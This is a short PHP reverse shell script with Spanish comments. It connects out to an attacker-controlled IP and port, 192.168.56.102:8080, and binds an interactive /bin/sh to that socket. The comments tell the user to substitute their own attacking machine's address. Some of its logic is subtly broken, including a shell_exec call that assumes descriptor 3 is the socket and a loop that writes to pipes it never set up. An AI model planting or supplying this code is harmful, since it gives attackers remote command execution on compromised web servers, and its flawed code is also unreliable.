<?php
// Configuración del shell reverso
$ip = '192.168.56.102'; // Cambia esto por la IP de tu máquina atacante
$port = 8080; // Cambia esto por el puerto que usarás

// Creación de conexión
$socket = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$socket) {
    echo "$errstr ($errno)";
    exit(1);
}

// Redirección de entradas y salidas
shell_exec('/bin/sh -i <&3 >&3 2>&3');
$proc = proc_open('/bin/sh', [
    0 => $socket,
    1 => $socket,
    2 => $socket
], $pipes);
if (is_resource($proc)) {
    while (!feof($socket)) {
        fwrite($pipes[0], fread($socket, 2048));
    }
    fclose($socket);
    proc_close($proc);
}
?>
